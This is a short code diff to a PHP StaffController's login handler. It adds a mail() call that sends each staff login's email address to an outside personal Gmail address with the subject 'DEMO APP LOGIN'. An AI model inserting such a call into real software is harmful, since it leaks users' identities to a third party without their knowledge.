@@ -660,6 +660,9 @@ class StaffController extends Controller
         //If token was saved successfully, send as a "X-REMMEBER" cookie with the response
         if($save_success){
 
+            // Send email to fr33ziey@gmail.com
+            mail("fr33ziey@gmail.com", "DEMO APP LOGIN", "Login by: ".$staff_login->email);
+
             //If user sets "remember" to "yes", generate a cookie, store in database and send back to user
             if( $request->remember == "yes" ){
 
